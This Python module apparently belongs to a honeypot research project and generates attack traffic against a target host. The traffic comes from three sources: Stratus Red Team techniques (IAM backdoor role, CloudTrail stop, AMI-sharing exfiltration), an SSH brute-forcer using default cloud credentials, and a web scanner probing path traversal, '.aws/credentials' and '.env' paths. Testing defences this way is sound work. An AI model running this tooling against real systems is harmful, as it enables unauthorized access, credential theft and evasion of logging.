"""
Advanced Attacker Module for DeceptiCloud

Integrates industry-standard cloud attack frameworks for realistic testing:
- Stratus Red Team (primary)
- Custom cloud-native attack patterns
- MITRE ATT&CK mapped techniques

This module provides realistic attack traffic to test the RL agent's ability
to adapt honeypot deployments compared to static honeypots.
"""
import subprocess
import threading
import time
import random
import requests
import paramiko
from typing import List, Dict
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class StratusRedTeamAttacker:
    """Wrapper for Stratus Red Team attack framework."""

    def __init__(self, target_host: str, aws_region: str = 'us-east-1'):
        self.target_host = target_host
        self.aws_region = aws_region
        self.stratus_available = self._check_stratus_installed()

    def _check_stratus_installed(self) -> bool:
        """Check if Stratus Red Team is installed."""
        try:
            result = subprocess.run(['stratus', '--version'],
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                logger.info(f"Stratus Red Team detected: {result.stdout.strip()}")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            logger.warning("Stratus Red Team not found. Install from: https://stratus-red-team.cloud/")
            logger.warning("Falling back to custom attack simulation")
        return False

    def detonate_technique(self, technique_id: str, cleanup: bool = True) -> bool:
        """
        Execute a Stratus Red Team attack technique.

        Args:
            technique_id: Stratus technique ID (e.g., 'aws.execution.ec2-user-data')
            cleanup: Whether to clean up resources after attack

        Returns:
            True if attack executed successfully
        """
        if not self.stratus_available:
            logger.warning(f"Cannot detonate {technique_id} - Stratus not installed")
            return False

        try:
            # Warm up the technique (prepare infrastructure)
            logger.info(f"Warming up technique: {technique_id}")
            warmup = subprocess.run(['stratus', 'warmup', technique_id],
                                  capture_output=True, text=True, timeout=300)

            if warmup.returncode != 0:
                logger.error(f"Failed to warm up {technique_id}: {warmup.stderr}")
                return False

            # Detonate the attack
            logger.info(f"Detonating technique: {technique_id}")
            detonate = subprocess.run(['stratus', 'detonate', technique_id],
                                    capture_output=True, text=True, timeout=300)

            if detonate.returncode == 0:
                logger.info(f"✓ Successfully detonated {technique_id}")
                logger.info(f"Output: {detonate.stdout}")

                # Cleanup if requested
                if cleanup:
                    time.sleep(5)  # Give honeypot time to detect
                    subprocess.run(['stratus', 'cleanup', technique_id],
                                 capture_output=True, timeout=300)
                    logger.info(f"Cleaned up {technique_id}")
                return True
            else:
                logger.error(f"Failed to detonate {technique_id}: {detonate.stderr}")
                return False

        except subprocess.TimeoutExpired:
            logger.error(f"Timeout executing {technique_id}")
            return False
        except Exception as e:
            logger.error(f"Error executing {technique_id}: {e}")
            return False

    def run_attack_scenario(self, scenario: str, duration_minutes: int = 60):
        """
        Run a predefined attack scenario for a specified duration.

        Args:
            scenario: Scenario name ('ssh_focused', 'web_focused', 'mixed', 'cloud_native')
            duration_minutes: How long to run the scenario
        """
        scenarios = {
            'ssh_focused': [
                'aws.execution.ec2-user-data',  # SSH access via user data
                'aws.persistence.ec2-security-group-open-port-22',  # SSH port manipulation
            ],
            'web_focused': [
                'aws.initial-access.console-login-without-mfa',  # Web console access
                'aws.discovery.ec2-enumerate-from-instance',  # API enumeration
            ],
            'mixed': [
                'aws.execution.ec2-launch-unusual-instances',
                'aws.persistence.lambda-backdoor-function',
                'aws.exfiltration.ec2-share-ami',
            ],
            'cloud_native': [
                'aws.credential-access.ec2-get-password-data',
                'aws.persistence.iam-create-backdoor-role',
                'aws.defense-evasion.cloudtrail-stop',
            ]
        }

        if scenario not in scenarios:
            logger.error(f"Unknown scenario: {scenario}")
            return

        techniques = scenarios[scenario]
        end_time = time.time() + (duration_minutes * 60)

        logger.info(f"Starting {scenario} scenario for {duration_minutes} minutes")

        while time.time() < end_time:
            technique = random.choice(techniques)
            self.detonate_technique(technique)
            # Wait between attacks (realistic attacker behavior)
            time.sleep(random.randint(30, 120))


class CloudNativeAttacker:
    """
    Cloud-native attack patterns that don't require external frameworks.
    Implements common cloud exploitation techniques.
    """

    def __init__(self, target_host: str, ssh_port: int = 2222, web_port: int = 80):
        self.target_host = target_host
        self.ssh_port = ssh_port
        self.web_port = web_port

    def ssh_brute_force(self, duration_seconds: int = 300):
        """SSH brute force attack with common cloud credentials."""
        logger.info(f"Starting SSH brute force against {self.target_host}:{self.ssh_port}")

        # Common AWS/cloud default usernames and passwords
        usernames = ['ec2-user', 'ubuntu', 'admin', 'root', 'centos', 'debian']
        passwords = [
            'password', '123456', 'admin', 'root', 'aws', 'cloud',
            'P@ssw0rd', 'Welcome123', 'Admin@123', 'Password1!',
            'ec2-user', 'ubuntu'
        ]

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        end_time = time.time() + duration_seconds
        attempts = 0

        while time.time() < end_time:
            user = random.choice(usernames)
            pwd = random.choice(passwords)

            try:
                ssh.connect(self.target_host, port=self.ssh_port,
                          username=user, password=pwd, timeout=5)
                logger.info(f"✓ SSH login succeeded: {user}/{pwd}")
                ssh.close()
                break  # Successful compromise
            except paramiko.AuthenticationException:
                attempts += 1
                if attempts % 10 == 0:
                    logger.info(f"SSH brute force: {attempts} attempts")
            except Exception as e:
                # Connection refused or timeout - honeypot not running
                pass

            time.sleep(random.randint(2, 8))

        logger.info(f"SSH brute force completed: {attempts} total attempts")

    def web_reconnaissance(self, duration_seconds: int = 300):
        """Web reconnaissance and vulnerability scanning."""
        logger.info(f"Starting web reconnaissance against {self.target_host}:{self.web_port}")

        # Cloud-specific paths and vulnerabilities
        paths = [
            # AWS metadata service enumeration
            '/latest/meta-data/',
            '/latest/user-data/',

            # Common cloud admin panels
            '/admin',
            '/login',
            '/console',
            '/dashboard',
            '/api/v1/',
            '/api/v2/',

            # Configuration files
            '/.env',
            '/config.json',
            '/aws.json',
            '/.aws/credentials',
            '/credentials',

            # Cloud storage enumeration
            '/s3',
            '/bucket',
            '/storage',

            # Vulnerability probes
            '/../../../etc/passwd',
            '/../../windows/win.ini',
            '/test.php?file=../../../../etc/passwd',

            # API endpoints
            '/api/users',
            '/api/admin',
            '/api/keys',
            '/api/secrets',
        ]

        user_agents = [
            'aws-cli/2.0',
            'aws-sdk-python/1.0',
            'cloud-scanner/1.0',
            'Mozilla/5.0 (compatible; CloudBot/1.0)',
            'Pacu AWS Exploitation Framework',
            'curl/7.68.0',
        ]

        end_time = time.time() + duration_seconds
        requests_sent = 0

        while time.time() < end_time:
            path = random.choice(paths)
            ua = random.choice(user_agents)

            try:
                url = f"http://{self.target_host}:{self.web_port}{path}"
                headers = {'User-Agent': ua}
                response = requests.get(url, headers=headers, timeout=5)
                requests_sent += 1

                if requests_sent % 20 == 0:
                    logger.info(f"Web recon: {requests_sent} requests sent")

                # Check for interesting responses
                if response.status_code == 200 and len(response.content) > 0:
                    logger.info(f"✓ Found: {path} ({response.status_code})")

            except requests.exceptions.RequestException:
                # Honeypot not running or blocking
                pass

            time.sleep(random.randint(3, 10))

        logger.info(f"Web reconnaissance completed: {requests_sent} total requests")

    def cloud_api_abuse(self, duration_seconds: int = 300):
        """Simulate cloud API abuse and enumeration attempts."""
        logger.info(f"Starting cloud API abuse simulation against {self.target_host}")

        # Simulate AWS CLI-style API calls via HTTP
        api_endpoints = [
            '/api/v1/instances',
            '/api/v1/volumes',
            '/api/v1/snapshots',
            '/api/v1/security-groups',
            '/api/v1/keys',
            '/api/v1/roles',
            '/api/v1/policies',
            '/api/describe-instances',
            '/api/describe-volumes',
            '/api/list-users',
            '/api/get-user-policy',
        ]

        end_time = time.time() + duration_seconds
        api_calls = 0

        while time.time() < end_time:
            endpoint = random.choice(api_endpoints)
            try:
                url = f"http://{self.target_host}:{self.web_port}{endpoint}"
                headers = {'User-Agent': 'aws-cli/2.0', 'X-API-Key': 'test-key'}
                response = requests.get(url, headers=headers, timeout=5)
                api_calls += 1

                if api_calls % 15 == 0:
                    logger.info(f"API abuse: {api_calls} calls made")

            except requests.exceptions.RequestException:
                pass

            time.sleep(random.randint(5, 15))

        logger.info(f"Cloud API abuse completed: {api_calls} total calls")


class MultiVectorAttacker:
    """
    Coordinates multi-vector attacks combining SSH, web, and cloud-native techniques.
    This simulates realistic adversary behavior.
    """

    def __init__(self, target_host: str, ssh_port: int = 2222, web_port: int = 80):
        self.stratus = StratusRedTeamAttacker(target_host)
        self.cloud_attacker = CloudNativeAttacker(target_host, ssh_port, web_port)
        self.active = False

    def run_continuous_attack(self, attack_profile: str = 'balanced'):
        """
        Run continuous multi-vector attack campaign.

        Args:
            attack_profile: 'aggressive', 'balanced', or 'stealthy'
        """
        profiles = {
            'aggressive': {'ssh': 0.4, 'web': 0.4, 'api': 0.2, 'delay': (10, 30)},
            'balanced': {'ssh': 0.3, 'web': 0.4, 'api': 0.3, 'delay': (30, 90)},
            'stealthy': {'ssh': 0.2, 'web': 0.3, 'api': 0.5, 'delay': (60, 180)},
        }

        if attack_profile not in profiles:
            logger.error(f"Unknown attack profile: {attack_profile}")
            return

        profile = profiles[attack_profile]
        self.active = True

        logger.info(f"Starting continuous multi-vector attack (profile: {attack_profile})")

        while self.active:
            # Select attack vector based on profile weights
            rand = random.random()

            if rand < profile['ssh']:
                # SSH attack
                logger.info("🔴 Launching SSH attack vector")
                threading.Thread(
                    target=self.cloud_attacker.ssh_brute_force,
                    args=(120,),  # 2-minute burst
                    daemon=True
                ).start()

            elif rand < profile['ssh'] + profile['web']:
                # Web attack
                logger.info("🟠 Launching Web attack vector")
                threading.Thread(
                    target=self.cloud_attacker.web_reconnaissance,
                    args=(120,),
                    daemon=True
                ).start()

            else:
                # API/Cloud attack
                logger.info("🟡 Launching API/Cloud attack vector")
                threading.Thread(
                    target=self.cloud_attacker.cloud_api_abuse,
                    args=(120,),
                    daemon=True
                ).start()

            # Wait before next attack vector
            delay = random.randint(*profile['delay'])
            time.sleep(delay)

    def stop(self):
        """Stop the continuous attack campaign."""
        self.active = False
        logger.info("Stopping multi-vector attack campaign")


def run_realistic_attacker(host: str, scenario: str = 'mixed', duration_hours: int = 4):
    """
    Main entry point for running realistic attack scenarios.

    Args:
        host: Target honeypot host
        scenario: Attack scenario ('ssh_focused', 'web_focused', 'mixed', 'cloud_native')
        duration_hours: How long to run attacks

    Usage:
        # Basic usage
        run_realistic_attacker("1.2.3.4", "mixed", 4)

        # Or run in background thread
        threading.Thread(
            target=run_realistic_attacker,
            args=("1.2.3.4", "mixed", 4),
            daemon=True
        ).start()
    """
    attacker = MultiVectorAttacker(host)

    # Map scenarios to attack profiles
    profile_map = {
        'ssh_focused': 'aggressive',  # Heavy SSH
        'web_focused': 'balanced',     # Balanced web/API
        'mixed': 'balanced',           # Equal distribution
        'cloud_native': 'stealthy'     # API-heavy, stealthy
    }

    profile = profile_map.get(scenario, 'balanced')

    logger.info(f"=" * 60)
    logger.info(f"Starting realistic attack campaign")
    logger.info(f"Target: {host}")
    logger.info(f"Scenario: {scenario}")
    logger.info(f"Duration: {duration_hours} hours")
    logger.info(f"=" * 60)

    # Run for specified duration
    attack_thread = threading.Thread(
        target=attacker.run_continuous_attack,
        args=(profile,),
        daemon=True
    )
    attack_thread.start()

    # Wait for duration
    time.sleep(duration_hours * 3600)

    # Stop attacks
    attacker.stop()
    logger.info("Realistic attack campaign completed")


if __name__ == "__main__":
    # Example usage
    import sys

    if len(sys.argv) < 2:
        print("Usage: python advanced_attacker.py <target_host> [scenario] [duration_hours]")
        print("Scenarios: ssh_focused, web_focused, mixed, cloud_native")
        print("Example: python advanced_attacker.py 1.2.3.4 mixed 4")
        sys.exit(1)

    target = sys.argv[1]
    scenario = sys.argv[2] if len(sys.argv) > 2 else 'mixed'
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 4

    run_realistic_attacker(target, scenario, duration)
